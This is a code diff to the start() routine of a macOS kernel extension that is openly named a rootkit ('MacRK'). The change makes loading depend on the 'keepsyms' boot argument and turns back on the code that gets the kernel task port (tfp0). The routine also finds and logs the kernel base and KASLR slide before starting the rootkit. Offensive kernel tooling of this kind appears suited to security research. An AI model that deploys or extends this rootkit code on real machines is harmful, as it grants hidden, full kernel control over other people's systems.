@@ -46,51 +46,60 @@ void IOKernelRootKitService::free() {
 }
 
 bool IOKernelRootKitService::start(IOService* provider) {
+    bool keep_syms = false;
+
     kern_return_t ret = kIOReturnSuccess;
 
     if (loaded) {
-    IOService:
-        stop(provider);
+        IOService::stop(provider);
 
         return !loaded;
     }
 
+    PE_parse_boot_argn("keepsyms", &keep_syms, sizeof(keep_syms));
+
     loaded = true;
 
-    xnu::Mach::VmAddress kernel_base = xnu::Kernel::findKernelBase();
+    if (keep_syms) {
+        xnu::Mach::VmAddress kernel_base = xnu::Kernel::findKernelBase();
 
-    UInt64 kernel_slide = xnu::Kernel::findKernelSlide();
+        UInt64 kernel_slide = xnu::Kernel::findKernelSlide();
 
-    char buffer[128];
+        char buffer[128];
 
-    MAC_RK_LOG("MacRK::IOKernelRootKitService::start()!\n");
+        MAC_RK_LOG("MacRK::IOKernelRootKitService::start()!\n");
 
-    snprintf(buffer, 128, "0x%llx", kernel_base);
+        snprintf(buffer, 128, "0x%llx", kernel_base);
 
-    MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_base = %s\n", buffer);
+        MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_base = %s\n", buffer);
 
-    snprintf(buffer, 128, "0x%llx", kernel_slide);
+        snprintf(buffer, 128, "0x%llx", kernel_slide);
 
-    MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_slide = %s\n", buffer);
+        MAC_RK_LOG("MacRK::IOKernelRootKitService::kernel_slide = %s\n", buffer);
 
-    snprintf(buffer, 128, "0x%x", *(UInt32*)kernel_base);
+        snprintf(buffer, 128, "0x%x", *(UInt32*)kernel_base);
 
-    MAC_RK_LOG("MacRK::@ kernel base = %s\n", buffer);
+        MAC_RK_LOG("MacRK::@ kernel base = %s\n", buffer);
 
-    if (kernel_base && kernel_slide) {
-        this->kernel = xnu::Kernel::create(kernel_base, kernel_slide);
+        if (kernel_base && kernel_slide) {
+            this->kernel = xnu::Kernel::create(kernel_base, kernel_slide);
 
-        this->kernel->setRootKitService(this);
+            this->kernel->setRootKitService(this);
 
-        // this->tfp0 = this->kernel->getKernelTaskPort();
+            this->tfp0 = this->kernel->getKernelTaskPort();
 
-        ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
+            ret = mac_rootkit_start(this, this->kernel, &this->rootkitKext);
 
-        if (ret == kIOReturnSuccess) {
-            this->rootkit = mac_rootkit_get_rootkit();
+            if (ret == kIOReturnSuccess) {
+                this->rootkit = mac_rootkit_get_rootkit();
+            }
+
+            registerService();
         }
+    } else {
+        MAC_RK_LOG("MacRK::failed to load! Please enable keepsyms=1 as a boot-arg in NVRAM!\n");
 
-        registerService();
+        return kIOReturnUnsupported;
     }
 
     return ret == kIOReturnSuccess && IOService::start(provider);
